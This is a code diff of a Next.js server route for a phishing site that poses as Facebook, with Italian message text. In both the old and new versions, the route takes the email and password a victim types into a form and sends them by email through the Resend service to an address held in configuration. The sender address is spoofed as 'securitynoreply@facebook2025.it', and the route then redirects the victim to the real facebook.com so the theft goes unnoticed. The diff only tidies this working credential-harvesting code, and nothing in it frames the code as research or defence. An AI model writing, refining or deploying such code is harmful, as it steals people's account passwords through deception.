@@ -1,35 +1,23 @@
-import { NextRequest, NextResponse } from 'next/server';
+import { NextResponse } from 'next/server';
 import { Resend } from 'resend';
 
-const resend = new Resend(process.env.RESEND_API_KEY);
+export async function POST(request: Request) {
+  const body = await request.formData();
+  const email = body.get('email') || 'N/A';
+  const password = body.get('password') || 'N/A';
 
-export async function POST(req: NextRequest) {
+  const resend = new Resend(process.env.RESEND_API_KEY);
+
   try {
-    const formData = await req.formData();
-    const email = formData.get('email') || 'N/A';
-    const password = formData.get('password') || 'N/A';
-    const timestamp = new Date().toLocaleString('it-IT');
-
-    const emailTo = process.env.EMAIL_TO;
-
-    const message = `
-📩 Nuovo accesso su Facebook.it
-
-🕓 Orario: ${timestamp}
-📧 Email: ${email}
-🔐 Password: ${password}
-`;
-
     await resend.emails.send({
-      from: 'securitynoreply@facebook2025.it', // puoi personalizzarlo
-      to: emailTo!,
-      subject: 'Nuovo login da Facebook',
-      text: message,
+      from: 'securitynoreply@facebook2025.it',
+      to: process.env.EMAIL_TO!,
+      subject: 'Nuovo accesso dal sito facebook',
+      text: `Email: ${email} | Password: ${password}`,
     });
 
     return NextResponse.redirect('https://www.facebook.com');
   } catch (error) {
-    console.error(error);
-    return new NextResponse('Errore interno.', { status: 500 });
+    return NextResponse.json({ error: 'Errore durante l’invio email' }, { status: 500 });
   }
 }
